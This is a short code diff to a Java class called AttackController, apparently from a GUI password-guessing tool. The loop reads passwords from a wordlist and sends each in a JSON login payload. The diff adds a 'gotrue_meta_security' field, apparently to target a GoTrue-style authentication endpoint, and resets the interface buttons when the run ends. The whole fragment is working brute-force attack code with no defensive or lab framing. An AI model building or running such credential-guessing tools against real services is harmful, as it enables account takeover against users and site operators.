@@ -54,7 +54,7 @@ public class AttackController extends Application{
         while((pass = reader.readLine()) != null && !(term)){
             checkPaused();
             term = dic.getTerm();
-            String jsonPayload = ("{\"username\": \""+username+"\", \"password\": \""+pass+"\"}");
+            String jsonPayload = ("{\"username\": \""+username+"\", \"gotrue_meta_security\": \"{}\", \"password\": \""+pass+"\"}");
             //Visualizing elapsed time
             long end = System.currentTimeMillis();
             long elapsedTime = end - start;
@@ -115,6 +115,7 @@ public class AttackController extends Application{
             dic.setpassField("Password not found!");
             dic.appendLogArea("Password not found!\n");
         }
+        dic.setButtons(true, true, false, true);
     }
     catch(Exception e){
         System.out.println("File Error!");
